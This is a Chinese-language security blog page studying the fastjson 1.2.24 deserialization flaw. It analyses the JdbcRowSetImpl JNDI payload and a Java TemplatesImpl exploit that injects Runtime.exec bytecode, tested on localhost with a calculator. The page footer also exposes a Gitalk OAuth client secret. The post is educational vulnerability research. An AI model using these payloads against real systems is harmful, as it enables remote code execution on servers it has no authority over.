@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>fastjson反序列化漏洞学习 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="fastjson反序列化漏洞学习 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2021/10/31/fastjson反序列化漏洞学习/">
+<meta property="twitter:image" content="https://blog.play2win.top/2021/10/31/fastjson反序列化漏洞学习/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="fastjson反序列化漏洞学习" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="fastjson反序列化漏洞学习" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2021-10-31T06:20:53.000Z">2021-10-31</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    8 分钟 读完 (大约 1238 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                fastjson反序列化漏洞学习
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>fastjson反序列化，JAVA安全绕不过的坎。</p>
+<a id="more"></a>
+<h2 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h2><p>一般情况下，fastjson反序列化的结果是一个<code>JSONObject</code>的对象，但在序列化时设置<code>SerializerFeature</code>为<code>WriteClassName</code>，序列化的字符串就会多一个<code>@type</code>的键值对，在反序列化时就会按照<code>@type</code>的值，返回相应的对象。</p>
+<p>实验代码和运行结果如下，可以看到当反序列化的方法为<code>parse</code>和<code>parseObject</code>且传入参数为json字符串和Class实例时，会自动调用给定类的构造方法和setter方法；当放序列化方法为<code>parseObject</code>且只传入json字符串时，会调用给定类的构造方法、setter方法和全部的getter方法。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;</span><br><span class="line">    TestClass testClass = <span class="hljs-keyword">new</span> TestClass();</span><br><span class="line">    String json = JSON.toJSONString(testClass, SerializerFeature.WriteClassName);</span><br><span class="line">    System.out.println(json);</span><br><span class="line">    System.out.println(<span class="hljs-string">"---------------------------"</span>);</span><br><span class="line">    JSON.parse(json);</span><br><span class="line">    System.out.println(<span class="hljs-string">"---------------------------"</span>);</span><br><span class="line">    JSON.parseObject(json);</span><br><span class="line">    System.out.println(<span class="hljs-string">"---------------------------"</span>);</span><br><span class="line">    JSON.parseObject(json,TestClass.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-27 153646.png" alt></p>
+<p>综上，构造payload的入口类的构造方法、setter方法或getter方法需要具有实现想要功能的代码，或可通过这些方法跳转到中间衔接类或目的实现类。</p>
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>fastjson在1.2.24下有两个通用的payload：<code>JdbcRowSetImpl</code>和<code>TemplatesImpl</code>。</p>
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>从以下payload可以看出是通过JNDI注入实现命令执行的，搭好RMI服务后，在<code>Runtime</code>的<code>exec</code>方法下个断点。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:8888/Calc&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p>调用栈很简单，在<code>setAutoCommit</code>方法调用<code>connnet</code>方法，而<code>connnet</code>方法又使用我们设置的JNDI字符串调用<code>lookup</code>方法，加载恶意的工厂类导致命令执行。当然也因为是JNDI的利用方式，在一些低版本JDK环境下才能利用成功。</p>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-28 134343.png" alt></p>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>TemplatesImpl的POC构造比JdbcRowSetImpl复杂些，而且对反序列化的<code>SerializerFeature</code>参数有要求，使用<code>parseObject</code>时需要<code>JSON.parseObject(json, Object.class, Feature.SupportNonPublicField)</code>，<code>parse</code>方法时需要<code>JSON.parse(json,Feature.SupportNonPublicField)</code>，但好处就是无需出网加载恶意类。</p>
+<p>下面是利用代码，同样在<code>exec</code>方法下断点继续调试。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Templates</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = classPool.get(evil.class.getName());</span><br><span class="line">        String code = <span class="hljs-string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(code);</span><br><span class="line">        String randomClassName = <span class="hljs-string">"p1ay2win"</span> + System.nanoTime();</span><br><span class="line">        ctClass.setName(randomClassName);</span><br><span class="line">        ctClass.setSuperclass((classPool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">byte</span>[] evilCode = ctClass.toBytecode();</span><br><span class="line">        String encode = Base64.encodeBase64String(evilCode);</span><br><span class="line">        String json = <span class="hljs-string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\""</span> + encode + <span class="hljs-string">"\"], \"_name\": \"p1ya2win\", \"_tfactory\": &#123; &#125;, \"_outputProperties\":&#123; &#125;&#125;"</span>;</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用栈显示设置<code>outputProperties</code>而调用它的setter方法，接着再陆续调用<code>newTransformer</code>方法和<code>getTransletInstance</code>方法。主要的代码在<code>getTransletInstance</code>方法中，实例化<code>_class</code>数组里相应的Class实例。而<code>_class</code>数组我们是没有在json中设置的，它的赋值是在上面的<code>defineTransletClasses</code>方法。</p>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-29 174008.png" alt></p>
+<p>跟进<code>defineTransletClasses</code>方法，会通过<code>TransletClassLoader</code>的<code>defineClass</code>将我传入的<code>_bytecodes</code>字节转换为Class实例，但在这之前和之后会调用<code>_tfactory</code>的方法和判断<code>_transletIndex</code>是否小于0。这时可以利用fastjson自动实例化传空值的属性的类型的特性，将<code>_tfactory</code>初始化，然后<code>_transletIndex</code>的问题，可以令恶意类的父类为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>在if里给<code>_transletIndex</code>赋值。还有个<code>_name</code>属性，在<code>getTransletInstance</code>方法里判断为空则会返回空，不会进入到实例化的方法里，在这里给<code>_name</code>属性赋任意字符串值即可。</p>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 075859.png" alt></p>
+<p>还有个问题就是，payload里<code>_bytecodes</code>的值为数组套个base64的字符串，但在TemplatesImpl里<code>_bytecodes</code>的类型是二维数组字节。通过别的文章得知fastjson是使用自己的<code>IOUtils</code>工具类实现base64解码的，在相应的方法下断点。<code>ObjectArrayCodec</code>的<code>deserialze</code>方法调用<code>JSONScanner</code>的<code>bytesVAlues</code>方法进行base64解码。</p>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 131928.png" alt></p>
+<p>再往上几层跟进到<code>DefaultFieldDeserializer</code>的<code>parseField</code>方法，根据不同的<code>fieldValueDeserilizer</code>值通过<code>deserialze</code>反序列化获取属性的值。而<code>fieldValueDeserilizer</code>的值又是从<code>ParserConfig</code>的<code>getDeserializer</code>方法获取，在这个方法里，数组类型的属性会返回<code>ObjectArrayCodec</code>实例的<code>derializer</code>。<code>ObjectArrayCodec</code>会像调用栈所示那样，对数组类型属性的base64值解码还原。</p>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 134002.png" alt></p>
+<p>属性的问题明了了，回到<code>TemplatesImpl</code>的<code>getTransletInstance</code>方法，实例化<code>_class</code>Class实例数组里的类，执行类恶意类里的静态方法，至此利用结束。</p>
+<p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 135159.png" alt></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>平庸这东西犹如白衬衣上的污痕，一旦染上便永远洗不掉，无可挽回</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://y4er.com/post/fastjson-learn/" target="_blank" rel="noopener">https://y4er.com/post/fastjson-learn/</a></p>
+<p><a href="https://www.cnblogs.com/chengez/p/14789477.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengez/p/14789477.html</a></p>
+<p><a href="https://www.cnblogs.com/0x7e/p/14400933.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x7e/p/14400933.html</a></p>
+<p><a href="https://paper.seebug.org/1242/#commonscollections-2" target="_blank" rel="noopener">https://paper.seebug.org/1242/#commonscollections-2</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2021/10/31/fastjson反序列化漏洞学习/">fastjson反序列化漏洞学习</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2021/10/31/fastjson反序列化漏洞学习/">https://blog.play2win.top/2021/10/31/fastjson反序列化漏洞学习/</a></li>
+            <li><strong>发布时间：</strong>2021-10-31</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/反序列化/">反序列化</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2021/11/25/fastjson不出网利用简析/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">fastjson不出网利用简析</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/">
+                <span class="level-item">Confluence模板注入（CVE-2020-4027）复现</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: '88c3cf86647be06ace2f0c759fb68dce',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#反序列化原理">
+        <span class="has-mr-6">2</span>
+        <span>反序列化原理</span>
+        </a></li><li>
+        <a class="is-flex" href="#POC分析">
+        <span class="has-mr-6">3</span>
+        <span>POC分析</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#JdbcRowSetImpl">
+        <span class="has-mr-6">3.1</span>
+        <span>JdbcRowSetImpl</span>
+        </a></li><li>
+        <a class="is-flex" href="#TemplatesImpl">
+        <span class="has-mr-6">3.2</span>
+        <span>TemplatesImpl</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">4</span>
+        <span>后记</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">5</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
